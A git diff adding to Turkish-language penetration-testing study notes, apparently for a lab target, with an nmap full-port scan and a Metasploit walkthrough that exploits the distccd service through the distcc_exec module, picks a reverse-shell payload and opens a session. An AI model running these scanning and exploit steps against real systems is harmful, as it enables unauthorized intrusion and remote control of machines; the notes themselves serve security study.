@@ -1,5 +1,7 @@
 ### Sunucu ve Bilgisayar Sızma Testleri
 
+- hacktrick.xyz sitesi incele
+
 **_Recon_**
 
 - Hedef hakkında bilgi toplama süreci
@@ -168,3 +170,24 @@ meterpreter > help //yapabileceklerin çıkar
 - Script tabanlı analiz yapar (-sC) kapsamlı
 
 * -oN sonuc.txt // bulduğu sonucu kaydeder
+
+**_Script Argümanları _**
+
+~nmap 10.0.2.12 -A -p- -T5 //ne var ne yok çıkarır
+
+- nmap sonuclarında bilinmeyen bir port alıp.. 3632 distccd v1 cp
+
+~msfconsole
+msf6> ~search mysql // ilgili tüm modüller listelenir. ordan cp yapıp sonra show options vs... devam et
+msf6> ~search distccd
+
+msf6> exploit(unix/misc/distcc_exec)~ show payloads //komutu, seçili exploit ile uyumlu payload’ları listeler.Exploit için gerekli payload’lar.Reverse olanlar hedef makinenin sana geri bağlantı kurduğu payload’lardır.İlk bunları dene
+
+msf6> exploit(unix/misc/distcc_exec)~ set payload 5 //hepsini olana kadar dene ve devamında
+
+> show options
+> exploit -j -z
+> sessions -l
+> sessions 1
+
+diye devam et
